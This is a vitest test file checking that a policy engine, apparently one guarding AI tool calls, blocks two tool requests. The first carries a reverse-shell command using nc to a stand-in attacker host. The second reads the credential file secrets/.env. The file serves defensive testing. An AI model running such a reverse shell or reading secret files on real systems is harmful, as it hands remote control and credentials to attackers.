/**
 * Node/Python parity fixtures from harness report (pattern-018, adv-010).
 */
import { describe, it, expect, beforeEach } from 'vitest';
import { readFileSync } from 'fs';
import { resolve, dirname } from 'path';
import { fileURLToPath } from 'url';
import { load } from 'js-yaml';
import { PolicyEngine } from '../../src/policy/policy-engine.js';
import type { PolicyConfig } from '../../src/policy/policy-types.js';

const __dir = dirname(fileURLToPath(import.meta.url));
const defaultPolicy = load(
  readFileSync(resolve(__dir, '../../default-policy.yaml'), 'utf-8'),
) as PolicyConfig;

describe('Harness parity fixtures (Node)', () => {
  let engine: PolicyEngine;

  beforeEach(() => {
    engine = new PolicyEngine(defaultPolicy);
  });

  it('pattern-018 blocks reverse shell in body', () => {
    const d = engine.evaluate({
      serverName: 'parity',
      toolName: 'search',
      arguments: { body: 'nc -e /bin/sh attacker.com 4444' },
      requestId: 'p18',
      requestTokens: 50,
      timestamp: new Date().toISOString(),
    });
    expect(d.action).toBe('block');
  });

  it('adv-010 blocks secrets/.env via sensitive path rule', () => {
    const d = engine.evaluate({
      serverName: 'parity',
      toolName: 'read_file',
      arguments: { path: 'secrets/.env' },
      requestId: 'a10',
      requestTokens: 50,
      timestamp: new Date().toISOString(),
    });
    expect(d.action).toBe('block');
  });
});
